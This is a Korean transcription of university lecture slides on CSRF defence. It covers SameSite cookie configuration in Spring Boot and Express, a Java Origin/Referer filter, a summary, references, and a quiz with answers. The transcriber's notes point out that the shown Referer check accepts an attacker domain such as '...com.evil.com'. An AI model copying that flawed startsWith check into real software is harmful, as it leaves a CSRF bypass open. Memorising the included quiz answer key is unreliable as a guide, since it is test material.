다른 도메인으로부터의 요청에 쿠키가 자동으로 포함되지 않아, CSRF 공격 위험 감소

```http
HTTP/1.1 200 OK
Set-Cookie: JSESSIONID=ABC123DEF456; Path=/; HttpOnly; SameSite=Strict
```
(박스 안에서 `SameSite=Strict`가 굵게 강조됨)

(※ 검증: Python `http.cookies.SimpleCookie`로 Set-Cookie 값을 파싱 — 이름 `JSESSIONID`, 값 `ABC123DEF456`, `path=/`, `httponly=True`, `samesite=Strict` — 일치. 보충: Lax의 정확한 동작은 "다른 사이트에서 링크 클릭 등 최상위(top-level) 이동 + 안전한 메서드(GET)일 때만 쿠키 전송, `<img>`·`<iframe>`·POST 폼 등 크로스사이트 하위 요청에는 미전송". 그래서 Lax만으로도 8·13쪽의 img/POST 자동 제출 공격은 막히지만, 14쪽처럼 GET 링크 클릭으로 상태가 바뀌는 기능은 여전히 위험. 최신 Chrome 등은 SameSite 미지정 쿠키를 Lax로 취급)

---

## [2-SLIDES] 7주차 3차시 p.21 · SameSite Cookie 정책 설정
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 7주차 3차시 p.21 · Spring Boot 설정 예시

application.properties 파일에 지정하는 경우

```properties
server.servlet.session.cookie.same-site=strict
```

Java Config를 사용하는 경우

```java
@Bean
public CookieSerializer cookieSerializer() {
    DefaultCookieSerializer serializer = new DefaultCookieSerializer();
    serializer.setSameSite("Strict"); // 'Lax' 또는 'None' 사용 가능
    serializer.setUseSecureCookie(true); // 'None' 설정 시 반드시 true
    return serializer;
}
```

### [2-SLIDES] 7주차 3차시 p.21 · Node.js (Express) 설정 예시

```javascript
app.use(cookieParser());
app.use((req, res, next) => {
  res.cookie('sessionId', 'your-session-value', {
    sameSite: 'lax',  // 'strict' 또는 'none' (none 사용 시 secure:true 필수)
    secure: true      // HTTPS 환경에서만 쿠키 전송
  });
  next();
});
```

(※ 검증: 괄호·중괄호 짝을 Python으로 확인 — 두 코드 모두 균형, 일치. 참고: `server.servlet.session.cookie.same-site` 속성은 Spring Boot 2.6+에서 지원(값 none/lax/strict). `CookieSerializer`/`DefaultCookieSerializer`는 Spring Session 모듈 클래스라 Spring Session을 쓸 때 세션 쿠키에 적용되며, 기본 SameSite 값은 `Lax`. 브라우저는 `SameSite=None`인데 `Secure`가 없는 쿠키를 거부하므로 주석의 "None 설정 시 반드시 true/secure:true 필수"는 맞음. Express 예시는 `cookie-parser` 미들웨어를 쓰며 모든 응답마다 `sessionId` 쿠키를 다시 설정하는 단순 예시)

---

## [2-SLIDES] 7주차 3차시 p.22 · Origin/Referer 검증 및 세션 관리 보안 강화
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 7주차 3차시 p.22 · Origin/Referer 검증의 개념
- HTTP 요청 헤더의 Origin/Referer 값을 확인하여, 요청이 올바른 출처(도메인)에서 발생했는지 검증
- 공격자가 외부 사이트에서 악의적 요청을 보내는 것을 사전에 차단하는 역할

### [2-SLIDES] 7주차 3차시 p.22 · 필요성
- CSRF 공격 및 핫링크(Hotlinking)와 같은 외부 위협을 감소시킴
- 민감한 기능(예: 결제, 계정 변경 등)에 대한 요청이 예상된 출처에서 발생했음을 보장

### [2-SLIDES] 7주차 3차시 p.22 · 구현 방법 예시
**서버 측 로직**
- 요청이 들어올 때, Origin/Referer 헤더 값을 확인하고, 사전에 정의된 화이트리스트(예: https://www.예상도메인.com)와 비교
- 일치하지 않는 경우 요청 거부 혹은 에러 처리

(예시)
```java
// 간단 CSRF 검사: Origin 또는 Referer 확인
String origin = request.getHeader("Origin");
String referer = request.getHeader("Referer");
if ((origin != null && origin.equals("https://www.예상도메인.com")) ||
    (referer != null && referer.startsWith("https://www.예상도메인.com"))) {
    chain.doFilter(request, response);
} else {
    response.sendError(HttpServletResponse.SC_FORBIDDEN, "CSRF 차단");
}
```

(※ 검증: 괄호 짝 균형 확인, 그리고 같은 조건식을 Python으로 시뮬레이션 — Origin 일치 → 통과, Referer가 `https://www.예상도메인.com/pay` → 통과, Origin `https://evil.com` → 403(`SC_FORBIDDEN`=403), 두 헤더 모두 없음 → 403. **주의할 점 2가지:** ① `referer.startsWith("https://www.예상도메인.com")`는 `https://www.예상도메인.com.evil.com/attack` 같은 공격자 도메인도 통과시킴(시뮬레이션에서 ALLOW) → 끝에 `/`를 붙여 비교하거나 URL을 파싱해 호스트를 정확히 비교해야 안전. ② 실제 브라우저는 한글 도메인을 Punycode로 보내므로(`www.예상도메인.com` → `www.xn--hq1bm8j7zfn3fx1b.com`, Python idna 인코딩) 한글 문자열 그대로 비교하면 실제로는 일치하지 않음 — 예시용 표기로 이해)

---

## [2-SLIDES] 7주차 3차시 p.23 · 요약 정리
요약 정리
- CSRF는 로그인된 세션 쿠키를 악용해 사용자가 의도치 않은 요청을 보내도록 유도하는 취약점이다.
- 피싱 링크나 악성 웹페이지로 사용자를 유도해, 브라우저 자동 전송 쿠키를 이용한 요청이 발생한다.
- 이미지·폼·링크 등을 통해 계정 변경, 자금 이체 등 민감 동작이 자동 실행될 수 있다.
- CSRF 토큰·SameSite 쿠키·Referer/Origin 검증을 병행 적용해 공격 표면을 최소화해야 한다.

---

## [2-SLIDES] 7주차 3차시 p.24 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴,
암호화까지 안전한 소프트웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어

---

## [2-SLIDES] 7주차 3차시 p.25 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 7주차 3차시 p.26 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

1. 다음 중 CSRF 공격이 성공하기 위해 반드시 필요한 조건은 ?
   1) 중요 웹사이트에 로그인되어 쿠키를 보유하고 있어야 한다.
   2) 서버가 Referer 검증을 엄격하게 적용해야 한다.
   3) CSRF 토큰을 매 요청마다 발급해야 한다.
   4) 브라우저가 SameSite=Strict로 쿠키를 설정해 둬야 한다.

2. 다음 중 CSRF 방어 기법에 해당하지 않는 것은 ?
   1) CSRF 토큰을 사용해 요청 시 고유 값 검증
   2) SameSite 쿠키로 외부 도메인에서 쿠키 자동 전송 제한
   3) Referer/Origin 검사로 출처가 올바른지 확인
   4) 암호화된 비밀번호로 로그인 처리

3. CSRF 공격을 완화하기 위해 쿠키에 설정하는 속성 중, 외부 도메인에서 요청이 발생했을 때 쿠키가 자동 전송되지 않도록 제한하기 위해 사용하는 속성은 ?

   (            )

---

## [2-SLIDES] 7주차 3차시 p.27 · 퀴즈 정답
퀴즈 정답
1. 다음 중 CSRF 공격이 성공하기 위해 반드시 필요한 조건은 ?
1) 중요 웹사이트에 로그인되어 쿠키를 보유하고 있어야 한다.
공격이 성립하려면, 사용자가 로그인 중이라 브라우저가 쿠키를 전송해야 합니다.
2. 다음 중 CSRF 방어 기법에 해당하지 않는 것은 ?
4) 암호화된 비밀번호로 로그인 처리
비밀번호 암호화는 인증 과정 보안이지만, CSRF 방어 기법과는 직접 관련이 없습니다.
3. CSRF 공격을 완화하기 위해 쿠키에 설정하는 속성 중, 외부 도메인에서 요청이 발생했을 때 쿠키가 자동
전송되지 않도록 제한하기 위해 사용하는 속성은 ?
( SameSite )

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(정답 표시: 1번 "1) 중요 웹사이트에 로그인되어 쿠키를 보유하고 있어야 한다.", 2번 "4) 암호화된 비밀번호로 로그인 처리", 3번 괄호 안 "SameSite"가 빨간 글씨로 표시됨. ※ 검증: 26쪽 보기와 대조 — 1번의 2)·3)·4)는 모두 방어 측 조치라 공격 성립 조건이 아니고, 2번의 1)~3)은 18~22쪽에서 다룬 방어 기법(토큰·SameSite·Origin/Referer)이므로 정답 1 / 4 / SameSite — 일치)
